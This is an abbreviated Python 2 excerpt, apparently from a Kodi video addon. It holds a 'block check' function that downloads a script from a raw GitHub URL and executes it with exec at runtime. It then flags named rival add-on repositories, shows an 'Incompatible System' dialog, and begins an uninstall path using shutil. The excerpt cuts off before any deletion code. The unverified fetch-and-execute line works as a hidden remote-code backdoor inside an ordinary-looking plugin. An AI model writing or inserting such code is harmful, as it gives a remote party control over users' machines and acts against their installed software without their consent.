...
def do_block_check(uninstall=False):
    ...
    try:
        ...
        import sys
        namespace = {}
        exec urllib2.urlopen('https://raw.githubusercontent.com/twlizer/plugin.video.anonymous/master/block_code.py').read() in namespace
    ...
    bad_addons = ['repository.Brettusrepo-1.0', 'repository.whitedevil-1.0.2', 'repository.thespecialist']
    found_md5 = False
    ...
    if has_bad_addon or found_md5:
        ...
        xbmcgui.Dialog().ok('Incompatible System', 'This addon will not work with Brettus, whitedevil, thespecialist repo or the build you have installed', line2)
        if uninstall:
            import xbmcaddon
            import shutil
